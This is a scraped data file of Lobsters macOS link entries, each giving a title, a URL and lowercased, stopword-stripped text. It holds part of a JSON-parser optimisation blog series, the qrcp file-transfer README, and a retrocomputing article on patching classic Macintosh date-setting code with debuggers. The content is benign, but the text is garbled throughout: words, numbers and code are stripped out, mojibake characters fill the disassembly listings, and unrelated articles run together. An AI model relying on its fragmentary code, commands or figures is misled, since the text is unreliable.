bit thought effort complete also question hooking swift general simple attempt failed getting right method codable particular latter would require somewhat different approach instead instantiating object actively setting property need create temporary structure pas object decoder decode max superclass us approach probably wo nt hard main trickiness probably reconciling hierarchicalrecursive approach streaming required protocol probably also go little analysis hows why approach maybe provide feedback would interest interested production version extreme optimization one far fairly tame note help apple also companyteam performance agile coaching workshop consulting contact info metaobjectcom
80,Lobsters,mac,Apple macOS,Transfer Files over WiFi from Your Computer to Your Mobile Device by Scanning QR Code,https://github.com/claudiodangelis/qrcp,transfer file wifi computer mobile device scanning qr code,qrcp telegram channel qrcpdev work installation install latest development version go linux release raspberry pi release using package manager archlinux deb package ubuntu debian etc release page rpm package centos fedora etc release page window release page scoop scoop macos release page usage send file send file send multiple file zip file transferring receive file receive file current directory receive file specific directory option configuration file port network interface url keep server alive author qrcp qrfiletransfer claudio dangelis developed community join u credit arasatasaygin openlogos rule openlogos goreleaser clone similar project qrfileshare instantfiletransfer qrfiletransfer qrfiletransfer qrtransfernode qrdeliver qrfile quicktransfer sharefileqr sharefiles ezshare localfileshare qrcp license license,qrcp transfer file wifi computer mobile device scanning qr code without leaving terminal support development donating join telegram channel qrcpdev news development work qrcp bind web server address wifi network interface random port creates handler default handler serf content exit program transfer complete used receive file qrcp serf upload page handle transfer tool print qr code encodes text http address port randompath qr apps detect url decoded text act accordingly ie open decoded url default browser qr code scanned content begin downloading mobile browser send file mobile receive file mobile installation install latest development version go note requires go go get githubcomclaudiodangelisqrcp linux download latest linux targz archive release page extract move binary proper directory set execution permission extract archive tar xf copy binary sudo mv qrcp usrlocalbin set execution permission sudo chmod x usrlocalbinqrcp raspberry pi following arm release available release page using package manager archlinux package available aur deb package ubuntu debian etc download latest deb package release page run dpkg sudo dpkg confirm working qrcp version rpm package centos fedora etc download latest rpm package release page run rpm sudo rpm confirm working qrcp help window download latest window targz archive release page extract exe file scoop use scoop package management window install qrcp following oneliner scoop install qrcp macos download latest macos targz archive release page extract move binary proper directory set execution permission extract archive tar xf copy binary sudo mv qrcp usrlocalbin set execution permission sudo chmod x usrlocalbinqrcp confirm working qrcp help usage send file send file send multiple file sending multiple file qrcp creates zip archive file folder want transfer deletes zip archive transfer complete multiple file qrcp mydocumentpdf whole folder qrcp document zip file transferring choose zip file transferring receive file receiving file qrcp serf upload page choose file mobile receive file current directory qrcp receive receive file specific directory note folder must exist qrcp receive outputtmpdir option qrcp work without prior configuration however choose configure use specific value config command launch wizard let configure parameter like interface port fullyqualified domain name keep alive note network interface showing use listallinterfaces flag suppress interface filter qrcp listallinterfaces config configuration file default configuration file stored homeqrcpjson however specify location config file passing config flag qrcp config tmpqrcpjson mydocumentpdf port default qrcp listens random port pas port p flag choose specific one qrcp port mydocumentpdf network interface qrcp try automatically find suitable network interface use transfer one suitable interface found asks choose one want use specific interface pas interface flag webserver visible computer interface network qrcp mydocumentdpf also use special interface name bind web server making web server visible everyone network even external network useful want transfer file amazon digital ocean droplet google cloud platform compute instance vps qrcp mydocumentpdf url qrcp us two pattern url send http ip address port send random path receive http ip address port receive random path option available override pattern pas path flag use specific path url example resulting url http ip address port sendx qrcp pathx mydocumentpdf pas fqdn use fully qualified domain name instead ip useful combination using remote location resulting url http qrcp fqdn examplecom p myremotedocumentpdf keep server alive useful keep server alive transferring file example want transfer file multiple device use keepalive flag server shutdown automatically first transfer qrcp keepalive mydocumentpdf author qrcp originally called qrfiletransfer started idea claudio dangelis twitter current maintainer developed community join u credit logo provided arasatasaygin part openlogos initiative collection free logo open source project check rule claim one rule openlogos release handled goreleaser clone similar project qrfileshare similar idea executed nodejs react interface instantfiletransfer uncredited nodejs project similar qrfiletransfer python clone project qrfiletransfer another nodejs clone project qrtransfernode another nodejs clone project qrdeliver nodejs project similar qrfile transfer file scanning qr code quicktransfer nodejs clone project sharefileqr python reimplementation project sharefiles uncredited yet another nodejs clone project ezshare another nodejs two way file sharing tool supporting folder multiple file localfileshare share local file people smartphone download file pc qrcp desktop app clone qrcp writing c net core work window license mit see license
81,Lobsters,mac,Apple macOS,"Faster JSON Support for iOS/macOS, Part 7: Polishing the Parser",https://blog.metaobject.com/2020/04/faster-json-support-for-iosmacos-part-7.html,faster json support iosmacos part polishing parser,convenient setback damn torpedo full speed ahead eliminating nsnumber discussion protocol oriented programming note info metaobjectcom,convenient setback one thing may noticed last time around getting instance variable name class also still manually setting common key manually bit duplicated needlessly manual effort common key exactly ivar name however two piece information different place ivar name builder common string parse one way consolidating information creating convenience intializer decoding object follows initwithclass class classtodecode self self initwithbuilder mpwobjectbuilder alloc initwithclass classtodecode autorelease self setfrequentstrings nsarray classtodecode ivarnames collect return self still compute ivar name twice really big deal something fix later like issue probably using property name instead instance variable name case property postprocess get rid underscore added ivar synthesis code parse object simplifies following similar would see swift jsondecoder void decodempwdirect nsdata json mpwmasonparser parser mpwmasonparser alloc initwithclass testclass class nsarray objresult parser parseddata json quickly verifying performance still always oops performance dropped significantly could innocuous change lead performance regression profile show spending significantly time mpwsmallstringtable objectforkey method get byte nsstringcfstring case bit mysterious since changed virtually nothing little sleuthing revealed string question instance nstaggedpointerstring previously instance nscfconstantstring latter pointer byteoriented character orientation simply return former cleverly encodes character pointer first reconstruct byte representation method constructing representation computing size representation also appears fairly generic slow via stream nt really easy solve since creation nstaggedpointerstrring instance hardwired pretty deep corefoundation way disable optimization although would possible create new nsstring subclass byte buffer make sure convert class putting instance lookup table seems like lot work could revert convenience damn torpedo full speed ahead alternatively really wanted get rid whole process packing character data nsstring instance immediately unpack let leave regression instead previously builder nsstring key instance vaiable char keystr int keylen stringhandling case json parser split betweeen key nonkey casse nonkey case still conversion keycase directly sending char length builder case parsestring curptr endptr stringstart curptr curptr builder writekeystring stringstart length curptrstringstart curptr else curstr self makeretainedjsonstringstart stringstart length curptrstringstart builder writestring curstr curptr break mean least temporarily json escape handling disabled key straightforward add back makeretainedjsonstringstart length processing character buffer converting string object end void writestring nsstring astring keystr mpwvalueaccessor accesssorobjectforstringlength selfaccessortable keystr keylen accesssor setvalue astring fortarget tos keystrnull else self pushobject astring key dictionary otherwise array toplevel dictionary case fetch valueaccessor via objectforstringlength macro result encouraging mb mpwplistbuilder also need adjusted build nsdictionary object actually need nsstring key parser longer delivers creates fly nsstring key nsstring keynil keystr commonstrings keyobjectforstringlength commonstrings keystr keylen key key nsstring alloc initwithbytes keystr length keylen encoding autorelease return key surprisingly make dictionary parsing code slightly faster bringing par nssjssonserialization eliminating nsnumber use nsnumbercfnumber value similar use nsstring key parser wrap parsed number object builder unwraps changing initially integer straightforward add integervalued message builder protocol implement void writeinteger long number keystr mpwvalueaccessor accesssorobjectforstringlength accessortable keystr keylen accesssor setintvalue number fortarget tos keystrnull else self pushobject number actual integer parsing code mpwmasonparser superclass nt want touch let copypaste code modifying return c primitive type instead object long longelementatptr const char start length long len long int const char endstartlen start start else start start start end isdigit start valval start start val sign return val sure better way turn string int similarly keystring distinction special case integer isreal number self realelement numstart length curptrnumstart builder writestring number else long n self longelementatptr numstart length curptrnumstart builder writeinteger n pretty clean later together using direct instance variable access instead property get accessortable yield noticeable speed boost m mb nice discussion happened random hacking profile replacing nice objectoriented programming ugly fast c although obviously truth profile used c primitive type appeared would contend happened move away object particularly away generic expensive foundation object foundation oriented programming towards message oriented programming sorry long ago coined term object topic get many people focus lesser idea big idea messaging kernal smalltalksqueak something never quite completed xerox parc phase japanese small word perhaps nearest english equivalent interstitial key making great growable system much design module communicate rather internal property behavior turn message oriented programming call protocol oriented programming objectivec shine coarsegrained object implemented c exchange message message also primitive get away idea follow idea objectivec hum get fast also flexible architecturally nicely decoupled object elegance combination object primitive message similar another architecturally elegant productive style unix pipe filter component c rich internal structure want talk via bytestreams also made fast also prevents least reduces coupling component another aspect tension api use api reuse particularly within constraint callreturn get tasked create component api parsing json something like nsjsonserialization something almost come feed json come parsed json nothing could convenient use parsing json mpwmasonparser hand convenient viewed isolation much capable smoothly integrated larger processing chain work nsjsonserialization name convenience wasted nt make processing easier suck enormous amount time anyway let look current profile first time small enough highresolution sampling necessary get meaningful result second nsnumbercfnumber nsstring packing unpacking gone even bigger chunk remaining time going object creation objcmsgsend starting actually become noticeable inefficient character level parsing accessors test object start appear barely work done far improved speed around started mb almost faster swift jsondecoder better stay tuned note help apple also companyteam performance agile coaching workshop consulting contact info metaobjectcom
82,Lobsters,mac,Apple macOS,"Somewhat Faster JSON Support for iOS/macOS, Part 6: Cutting KVC out of the Loop",https://blog.metaobject.com/2020/04/somewhat-faster-json-support-for.html,somewhat faster json support iosmacos part cutting kvc loop,last time key value coding setvalue forkey first article kvc slow key value coding enterprise object framework siren call kvo cocoa binding polymorphic identifier valueaccessor h hooking valueaccessor result analysis next step cfstringgetcstringptr note info metaobjectcom,last time actually made significant headway taking advantage dematerialisation plist intermediate representation instead first producing array dictionary went directly json final object representation got u around second little millisecond accomplished using key value coding method setvalue forkey directly set attribute object parsed json oh instantiating object first place instead dictionary much faster method example beating swift jsondecoder cool little surprising given kvc mentioned first article series slowest mechanism getting data objcets short deliberate rube goldber mechanism kvc slow key value coding core part next enterprise object framework introduced keyvalue coding data access mechanism property object accessed indirectly key name rather directly field invocation accessor method used throughout enterprise object perhaps useful accessing data relationship enterprise object keyvalue coding enables use keypaths traverse relationship example person entity relationship called tophoto whose destination entity called personphoto contains attribute called photo could access data traversing keypath tophotophoto within person object keypaths one way keyvalue coding invaluable feature enterprise object general though useful providing consistent way access object data rather needing know object data member accessor method name accessor method data accessible field need know key represent object data keyvalue coding automatically find data regardless object provides data context keyvalue coding satisfies classic design pattern principle encapsulate thing varies still extremely powerful programming technique let u write algorithm work generically object property currently basis coredata applescript support key value observing binding though somewhat skeptical least performance reason see siren call kvo cocoa binding also part inspiration polymorphic identifier core kvc valueforkey setvalue forkey message default implementation nsobject default implementation take nsstring key derive accessor message key send message either setting returning value value underlying message takesreturns nonobject type kvc wrapsunwraps necessary sound expensive derive set accessor key first character key capitalized string set prepended string converted objectivec selector sel theory done every call one kvc method done nsstring object fantastic job representing humanvisible text bit heavyweight lowlevel work full computation every invocation would way expensive apple cache intermediate result obvious place put intermediate result placed global hash table keyed class propertykey name however even lookup still significantly expensive final set get property access multiple lookup since thesis table global locking also required valueaccessor expense could avoided custom object mediate access rather naked nsstring object could store computed value provide fast generic access arbitrary property enter mpwvalueaccesssor h word warning unlike mpwstringtable mpwvalueaccesssor mostly experimental code test largely work incomplete many way also contains bunch extra probably extraneous idea sufficient current purpose core class accesspathcomponent struct typedef struct class targetclass int targetoffset sel getselector putselector getimp putimp id additionalarg char objctype accesspathcomponent struct contains number different way gettingsetting data integer offset object ivar located pair objectivec selectorsmessage name one getting one setting pair function pointer objectivec method respective selector resolve additional arg key used keyed access getimp putimp initialized objcmsgsend always used bind valueaccessor class function pointer get resolved actual gettersetter method addition objctype get set type instance variable automatic conversion like kvc code actually add last instalment current one key takeaway string processing lookup kvc need every call done initialization message andor preresolved function call hooking valueaccessor adapting mpwobjectbuilder h use mpwvalueaccessor much easier expected thee following show change made property nonatomic strong mpwsmallstringtable accessortable void setupacceessors class theclass nsarray ivars theclass ivarnames ivars ivars collect nsmutablearray accessors nsmutablearray arraywithcapacity ivarscount nsstring ivar ivars mpwvalueaccessor accessor mpwvalueaccessor valueforname ivar accessor bindtoclass theclass accessors addobject accessor mpwsmallstringtable table mpwsmallstringtable alloc initwithkeys ivars value accessors autorelease selfaccessortabletable void writeobject anobject forkey akey mpwvalueaccessor accesssor selfaccessortable objectforkey akey accesssor setvalue anobject fortarget tos bulk change come part new setupaccessors method first asks class instance variable creates value accessor instance variabl name bind accessor class finally put accessors lookup table keyed name writeobject forkey method modified look use value accessor instead using kvc result parsing driver code nt changed rerunning nonrepresentative mb json file yield following time m really starting get somewhere shy mb faster swift jsondecoder within raw nsjsonserialization analysis next step better yes glad asked let look profile first thing note objectcreation begindictionary entry parse another indicator moving right direction also closing endgame however still room improvement example although actually searching smallstringtable valueaccessor offsetofcstringwithlengthintableoflength take time getting internal char cfstring via fastpath cfstringgetcstringptr total time objectforkey multiple mean unwrapping nsstring take time actual work wrapping char length nsstring also take significant time work redundant would better passing along char length similar wrapunwrap situation occurs integer first turn nsnumbers immediately get integer set objcmsgsend also start getting noticeable looking bit impcaching eliminating unnecessary indirection also seems like good idea another aspect optimization work occasional big win welcome getting truly outstanding performance mean satisfied slogging smallish seeming detail note help apple also company performance agile coaching workshop consulting contact info metaobjectcom
83,Lobsters,mac,Apple macOS,Macintosh Y2020,http://basalgangster.macgui.com/RetroMacComputing/The_Long_View/Entries/2020/4/5_Macintosh_Y2020.html,macintosh,television ad clock would overflow robert braun andy hertzfeld guided tour macintosh tmon powerpc runtime environment adopted apple lombard powerbook basalgangster macguicom,â â computer short career product nt disappear popularity fade early original macintosh operating system construction nobody apple expected would still use year later right almost lot machine still around working people still use woke morning january unable set date old macintosh live glass house â â macintosh datesetting problem resembles infamous issue caused panic press twenty year ago name bug applied number different thing arose year date represented two decimal digit interpreted span affected system impossible set worse represent date past end nt sound like kind thing would set panic pundit predicted airplane would fall sky vital hospital equipment would fail hype anyway fixed army programmer recruited fix everything arrival millennium real cause bug system designer underestimated long system would remain use knew coding problem software thought nobody would using affected code long enough encounter problem â â peak brouhaha apple ran advertising campaign bragging macintosh immune problem ran television ad super bowl january hal fictional computer film space odyssey explained millennium bug caused bad judgement part programmer implication ad claimed programmer better make mistake like exactly accurate maybe nobody told ad company apple planted similar time bomb operating system set go year later time must stop â â computer usually keep track time counting number second elapsed since starting date number second counted depends number stored memory many small system personal computer past stored time unsigned bit integer time could run second sound like lot second add pretty quickly second day second nonleap year year span including one leap year second mean bit secondcounter keep time year almost month system used signed bit integer could encode time half long â â â time date selected start time also important factor example system used signed bit integer set time clock would overflow point clock would start date would read â â luckily designer macintosh nt anything quite bad used unsigned bit number least started clock time release date macintosh january end time system would occur would nt great nt nt know maybe good reason business computer intended inherit old file generated earlier generation machine need correctly interpret date stamp old file macintosh supposed something new effort made make compatible older system even older apple computer seems crazy time zero macintosh assigned midnight january right year macintosh even existed decade computer ever created file date stamp eighty macintosh year month clock time squandered macintosh clock time expires gmt monday february going problem user old macintosh problem year fixing possible require deeper cutting need problem setting clock setting clock â â clock struck midnight jan clock old macintosh ticked right correct date continued shown control panel file created changed many retrocomputing hobbyist use old machine may know problem try set date alarm clock date time control panel likely reason wanting set date power failure battery powering clock leaky clock battery leading cause death among old personal computer lot hobbyist take course remove battery need set clock every time system boot â â first epoch macintosh system including system date field alarm clock control panel show two decimal digit later version date field control panel set show century least significant two digit editable others change system enter editable digit set date date set value result century date entry inclusive give century result problem encountered user like bug except apple windowed year range instead â â obvious solution give trying use date time control panel builtin utility set date write ordinary user program set clock date within macintosh time span famously done computing aficionado robert braun whose program setdate downloaded site used macintosh hobbyist alarm january among small dedicated group old macintosh enthusiast â â fix builtin utility instead apple engineer mapped editable year digit year problem would arisen nobody know want set clock would possible restore date time control panel former usefulness remapping year â maybe small patch required something like changing code windowing approach worked system fix â â course macintosh one sequence operating system starting system january ending system released december program used set time changed lot period nt work alike fix process take trip evolution macintosh operating system elegant simplicity original system heady extravagance system labyrinthine patchwork powerpc version final day beginning system â â original macintosh operating system contained two file one rom one file called system one called finder strictly speaking finder part operating system userlevel program ran bootup complete provided user interface lot essential function like creating copying deleting printing renaming file also displayed information file disk allowed change disk launcher would start another program needed display edit file finder could lot thing could nt set date wo nt think system file contained menagerie thing data code everything o toolbox rom toolbox library useful system call data could evoked program system file internal structure kind directory piece code data lived system called resource lot different kind among resource system file standalone miniprograms called desk accessory ran memory space whatever program running executed parallel could create user interface small window could moved around top main program view could one running main program regularly donated little time run roundrobin basis could thing periodically way desk accessory stored executed changed system evolved continued work throughout entire version sequence macintosh old desk accessory ran original system would continue work system â â according andy hertzfeld one first ever desk accessory simple clock displayed full date time small window could used set time date intended prototype desk accessory think clock desk accessory may one distributed briefly first ever guided tour macintosh disk prove useful patch two desk accessory set date first macintosh release andy hertzfeld wrote desk accessory could used change array system parameter including date time original control panel beautiful textfree classic graphical user interface design built collaboration legendary pixelartist susan kare many piece macintosh software would time wear name control panel never well original â â original macintosh release contained another desk accessory called alarm clock written donn denman one could also set date time included alarm countdown timer well beginning two desk accessory worked almost exactly later iteration system difference disappeared ultimately alarm clock would removed time setting would become exclusive purview date time control panel â â future alarm clock control panel two way user set year one select lower two digit year type one two numeral keyboard user typed year new number immediately displayed system time stored number second since changed user typed enter changed focus clicking control closed window second method change year click little arrow appeared selected actually alter time applied typing enter changing selection window â â old macintosh emulator like minivmac run original macintosh operating system test may surprised see original system bug introduced later bug sort easily set year type either control panel alarm clock set date clicking arrow button offer flexibility control panel alarm clock use arrow button go year like keep clicking alarm clock try click across boundary set back type get use arrow button get later year creator original control panel alarm clock left undocumented loophole allows user set date year macintosh time span loophole present system prior system version function preserved later system would little reason bother patching anything patching original control panel â â nt really anything wrong original control panel instructive remap date setting changing span easier understand later version knowledge simpler predecessor control panel unchanged system version system fix system released unless one pioneer bought macintosh first three month system file came computer system came macintosh october â â control panel date display digit year ca nt tell century without clock use clock desk accessory first guided tour disk extracted using fontda mover also use incredible interactive debugger tmon written waldemar horwat tmon disassemble step executing code reveal everything â â learn lot watching control panel operation nt think hard number enter least first enter let make almost mistake corrects apply change set clock example let type month field apply change replace remainder likewise try set date february let change march nonleap year applies change century check done â hit enter typing digit â ca nt really tell see two digit entered way know see private data storage updated type number look place year stored code process key code start trigger tmon control panel trap setdatetime register change alter clock time execute type enter actually change date maybe lead location private date record enter setdatetime line labeled trap intercept user area exit tmon back control panel change date type enter starting year change clock changed tmon disassembly executing code opening disassembly window anchoring address little contained program counter pc â little piece code take date datetimerecord convert second since jan using toolbox call set clock using setdatetime datetimerecord sequence word memory separately representing year month day hour minute second day week trap expects address datetimerecord time evoked opening dump window display content memory starting location location local storage date looking year first word hex next word month next day april point execution previous set instruction already calculated date clock set stored location value want find code nt subroutine got typing key maybe routine evoked code seeing one handle keystroke ended via subroutine call might find keystroke handling routine via return address stored stack look stack address using tmon stack address function display return address currently activated code block put cursor line user area hit enter display return address code called subroutine contains setdatetime â â â â â â return address offset control panel drvr memory address point disassemble window region near location oh see line say cmpiw â decimal line testing see value exceeds branch skipping line add add depending whether greater set century must contain low two digit year entered code block seek nt clear simple â control panel originally written assembly language one master genre seeing exactly andy hertzfeld wrote let set breakpoint line comparison try changing date step code reveal flowâ â â â â â beginning block register contains numerical value digit typed contains address local storage area variable maintained control panel datetimerecord stored location meaning start byte beyond location contained program index datetimerecord one word time using assembly specified contains zero access year month etc user change year one keystroke one numeral time variable stored elsewhere local storage area toggle every keystroke indicates whether numeral entered first second numeral typed sequence zero mean numeral first numeral typed since date last changed numeral copied immediately tested directly see larger course added added make complete date stored location next zero stored toggled using indicate may next character block exited reentered next numeral typed next character year calculated first numeral fetched multiplied second numeral added result divided remainder moved first word register calculate low two digit year generated two keystroke example imagine typed originally ended year first time type multiplied give added get divided remainder stored would tested larger would added without adding would give new date century calculation done type two digit year type enter actually set clock â â think understand well enough try fix fix pretty easily change comparison year interpreted try test patch tmon change tmon applied program memory code disk stick necessary change control panel code disk â â done using hex editor using hex editor built resource editor resorcerer advantage builtin disassembler easy verify change made right spot want try change system file using make copy desk accessory separate file using fontda mover open file resorcerer code drvr resource id tmon saw offset relevant line code start alarm clock drvr resource scrolling vicinity exactly see original hex value cmpiw instruction change save use fontda mover install patched version system file patch complete alarm clock â â control panel fixed might hope alarm clock similar block code testing year maybe andy hertzfeld donn denman coordinating code maybe case great mind working alike use approach tmon find equivalent block code alarm clock quickly located searching hex editor hex sequence luckily one sequence alarm clock change see right code around look similar add hex add hex change happens â patch work typed numeral change made clicking little arrow button alarm clock must another test go arrow button make sense arrow nt work quite way alarm clock control panel arrow button could take year alarm clock detects attempt click arrow across border set clock back opposite thing happens click arrow go instance anywhere critical section code found searching find place tmon set breakpoint walk see happening â â start line say lea called contains increment year made clicking arrow contains field changed year month etc datetimerecord change located location address placed change added field indicated value turned date second converted back datetimerecord unnecessary changing year helpful incremented month example month incremented changed date field collected datetimerecord zero meaning contains year compared first test check resulting year le year greater equal tested see le get test unchanged test outside range year stored changed opposite direction original arrow click see ultimately cause click traverse loop backing year one one till get point loop revers direction advance one forward point test satisfied stop click cause opposite thing cascade year increase reached change direction back stop date somehow already outside range test nt matter date set piece code arrow click advance forward â â alarm clock use simple test typed year loop arrow click would nt simpler detect year subtract sure reason nt see maybe implement loophole like one control panel anyway easy u patch change alarm clock like control panel work way want â â although change piece code cause toâ occur different location alarm clock code code block appropriate patch system finished alarm clock get system system control panel â â system released distributed macintosh plus introduced hierarchical file system among thing allowed placement operating system file special folder called system folder substantial change control panel larger screen thing spaced farther apart abandon artistic picturesonly approach taken original guess decided user needed explanatory text understand setting need localized also also two new setting one activate appletalk one set ram cache easy see ram cache could represented picture susan kare might able time left apple work next something removed setting date time various version system date time must set alarm clock alarm clock unchanged however patched described patched alarm clock earlier system installed using fontda mover mean work system file version system â â system released foundational change control panel became container control panel module code user interface user selected control panel module list icon along left margin main window control panel still desk accessory module contained system file packaged new kind code resource called cdev placed individual file scattered around system folder control panel desk accessory would look load started made possible add control panel unique individual feature macintosh needed macintosh ii released march card cage user could put party board unanticipated function style control panel would used release system may next computer released october used similar approach icon list top today mac inherited style system preference panel next â â function old control panel including date time setting implemented cdev called general general cdev evolved time apple attached version number cdevs possible track change system general system general version version version differed especially system part need patch conserved â â original code section one compare low two digit year still work exactly date changed using keyboard found patched described original control panel system control panel like alarm clock included year check change made arrow button code similar alarm clock except instead storing limit date code stored data datetimerecord searching value hex editor string search midnight jan one second midnight jan â â â â â system general control panel unlike alarm clock date change resulting arrow click checked year impossible set year past method sadly somehow course reintroducing time date setting control panel lost clever loophole left u andy hertzfeld one let u set date however wanted using digit done wonder loophole still exists alarm clock maybe programmer general control panel thought loophole unintentional part original design concept maybe thought andy hertzfeld made mistake fixed sometimes programmer think job keep user thing might wrong rather enable user want whatever reason closing loophole act introduced problem macintosh system â â system version share one version alarm clock general control panel system version one system file system general control panel version system small change version change overall small one none involve setting date time patch need make occur slightly different place file identified way system â â system brought many change appearance operation macintosh also underlying code desk accessory including alarm clock control panel removed system file desk accessory could still used functioned like ordinary application could executed anywhere file system emulate way used previous system ususally added apple menu system initially came new version alarm clock already installed apple menu folder general cdev given version number apple synchronized version number across line software distributed operating system new version general control panel alarm clock stripped method setting date outside range apparently code written system general control panel used model new alarm clock would rather gone way keeping explanation alarm clock inherited general control panel variablebased comparison date using datetimerecords limit date rather year immediate value comparison however change made slight change code straightforward patch general control panel alarm clock system method already described system â â system released august fact first time apple charged customer upgrade hint maintenance release list new feature impressive remember skipped version lot code change date time setting still present general control panel still alarm clock addition entirely new date time control panel added three different program could set clock alarm clock look exactly original version date time control panel differed general control panel adding choice way format date â â resemblance general control panel alarm clock previous version deceptive code set time completely rewritten exactly time date control panel example alarm clock could tell except position code â â search orâ come empty back debugger left tmon behind switched use macsbug version tmon work system nowhere near useful one using anyway use macsbug system three date changing program small turned logging macsbug disassembled text file conveniently three program function name present code important part function called mytoggledate â â none program actually rangecheck date even code change date work done toolbox call introduced system called toggledate part new suite function called international date time utility evoked single toolbox entry point scriptutil utilize new version datetimerecord called longdatetimerecord one parameter scriptutil selector date time function wish execute key function u toggledate scriptutil selector â â toggledate abstract exactly task studying user typed numeral key keyboard clicked one arrow change month day year result change local copy date either datetimerecordâ number second since midnight used reset clock user later type enter change focus window parameter toggledate address data structure containing current date second modified toggledate variable called field indicating field longdatetimerec wish change eg year month day etc encoded enumeration delta ch together determine change making date parameter block called togglepb whose first field longword flag bit telling field range checked kind range checking increment decrement year user clicked arrow button delta would ch would ignored user keying new date delta set single character typed entered ascii ch â â internally toggledate first convert current date second longdatetimerecord change field specified field parameter value contained combined delta ch parameter pass resulting longdatetimerecord another toolbox call called validdate function convert date back second test see valid validity date includes two kind range checking one constrains date range time macintosh clock represent midnight gmt january gmt february second enforce old system control panel range two range check areâ controlled bitfields first field parameter togglepb three date time setting utility provided system bitfields set engage range check guess system released still seemed like long way away altering single bit field remove range check fix bug â â two bit smalldatebit restricts range macintosh time andâ gencdevrangebit restricts date range â â line mytoggledate strange number loaded location stack frame farther mytoggledate loading parameter forâ toggledate location pushed stack togglepb first longword contains flag determine range checking high word binary first bit indicating range checking clock time range second bit one restricts range set one bit turn one instance entire alarm clock one general control panel one date time control panel search hex editor change three â starting system â alarm clock removed time setting removed general control panel patch work time date control panel system patched code control panel changing single bit parameter toolbox call system â â system introduced appearance manager appearance manager made lot change look window control whole new set appearance managercompatible control one completely new control clock control included pretty complex widget drew date time set box like using set clock along clock control also includes code necessary track mouse movement make selection process keystroke detect click little arrow button increment decrement day month year even change date code searching finding date time control panel system gone still lot code fact larger ever none actually setting date time anymore put control go patch control â â code kind control stored resource called control definition function cdef clock cdef resource id normally one look cdefs system file system new feature introduced byâ appearance manager implemented special resource file called appearance extension located extension folder â â disassembling cdef code resorcerer easily find familiar piece code system including call toggledate line earlier togglepb loaded bit field change good go always changing system file use best make copy appearance extension file alter file replace old one patched one â â patch work system version appearance manager extension file also last version time date setting code assembly course sytem series system code graduallyâ shifted located resource replaced powerpc code stored data fork system powerpc code even part appearance manager powerpc version clock cdef part transition powerpc possible redundant code allowing power macintosh execute function natively whereas classic macintosh could execute version function builtin emulator allowed power macintosh execute code still made transition powerpc even run power macintosh executable code cdef appearance manager extension executes patch describe fix time date control panel system last version could run macintosh system beyond cdef resource stub real code cdef powerpc data fork yikes dive powerpc code data fork system â â starting system date time control panel clock control toggledate powerpc code stored big glob appropriately called fragment data fork system file resource manager longer use u finding way around code fragment possible thankfully wo nt instead relying hope thing organized basically system relevant code revealed brute force disassembly macsbug â â classic macintosh operating system written mostly assembly language hard today imagine writing entire operating system assembly language nt unusual time also instruction set compact understandable one key feature make readable simplicity subroutine call single link instruction set complete stack frame unlnk restore stack one movem instruction could save restore content list register rts needed return subroutine looking assembly language date time setting little code saw taken housekeeping subroutine call heart calculation moreover code written real people readability people written maintained assembly language form â â none said macintosh operating system version written maintained c code looking written person compiler compiler designed optimize performance readability nobody apple trying read form powerpc code verbose beginning end subroutine call even calling subroutine parameter passed register stack frame still required start every subroutine large prolog occupied saving register creating stack frame moving parameter register used parameter usually register used local variable end every subroutine long epilog housekeeping instruction combined correct practice modularizing everything small subroutine nt individually much produce long program dominated instruction nt anything care finding code looking searching needle haystack make matter worse powerpc runtime environment adopted apple contains many messy transition powerpc code requires lot housekeeping ok enough complaining â â guess programmer told take clock cdef toolbox call like toggledate translate c compile powerpc lombard powerbook system macsbug installed waded course started searching data fork hoping shortcircuit entire thing didnt work tried macsbug strategy used beginning one difference stepping code system hopeless immediately take rabbit hole subroutine calling others powerpc eventually end place called memory return time scale human life stepping every subroutine call would save would miss one looking hoping still clock cdef call toggledate â â open date time control panel trigger macsbug fkey powerbook programmer switch set atrap breakpoint called datetoseconds leave macsbug enter number year field back macsbug step across datetoseconds apparently called puticon still single step finish end readdatetime almost immediately call clockcdef atrap break datetoseconds step â puticon â â â â â datetosecondsâ â â â â â â â â â â â â â â â â â â â â â â â â datetoseconds â puticon â â â â â movelâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â moveqâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â leaâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â leaâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â movemlâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â rtsâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â movelâ â â â timeâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â movemlâ â â â â â â â â â â â â â â â â â â â tstwâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â rtsâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â movelâ â â â time â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â rtsâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â procedure name â â â â â â â â â â â â dcwâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â readdatetime â â â â â lwzâ â â â â â â sp â â â â â â â â â â â â â â â â â â â â â â â â â â â â â lwzâ â â â â â â sp â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â stwâ â â â â â â sp â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â addiâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â addicâ â â â â sp â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â mtlrâ â â â â â â â â â â â â â â â â â â â â â â â â â â â lr â â â â â lhauâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â blrâ â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â â clockcdef â â â â â lwzâ â â â â â â sp â â â â â â â â â â â â â â â â â â â â â â â â â â â â clockcdef â â â â â great something called clockcdef calculate starting place subtracting offset current instruction address address â â possible disassemble entire clockcdef starting beginning step toâ call toggledate find offset â â â â â addiâ â â â â â â â â â â â â â â â â â â â â â â â â â addiâ â â â â â â â â â â â â â â â â â â â â â â â â â addiâ â â â â â â â â â â â â â â â â â â â â â â â â â addiâ â â â â â â â â â â â â â â â â â â â â â â â â â â addiâ â â â â â â â â â â â â â â â â â â â â â â â â â â blâ â â â â â â â toggledateâ â â â â â â â parameter toggledate date second field changing year delta zero entered numeric digit ch ascii code digit entered togglepb containing range checking flag address interested loaded location byte stack look line eventually find kidding â code took line system took line powerpc system â yes yes â â â â â lisâ â â â 